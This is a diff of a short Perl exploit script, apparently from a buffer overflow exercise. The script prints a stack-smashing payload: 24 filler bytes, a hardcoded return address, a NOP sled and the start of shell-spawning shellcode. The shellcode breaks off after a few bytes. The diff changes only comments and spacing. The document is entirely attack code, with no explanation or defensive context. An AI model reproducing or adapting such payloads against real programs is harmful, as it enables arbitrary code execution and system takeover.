@@ -1,8 +1,12 @@
 #! /usr/bin/perl
-# --- Overflow the Buffer ---
+
+# --- Overflowing the Buffer (size of the buffer is : 24) ---
 print "A"x24;
+
 # --- Modify Ret Address ---
 # 0xbffff630
+
+
 print "\x30\xf6\xff\xbf";
 print "\x90"x8;
 print "\x31\xc0\xb0\x0b\x31\xdb\x53\x68";
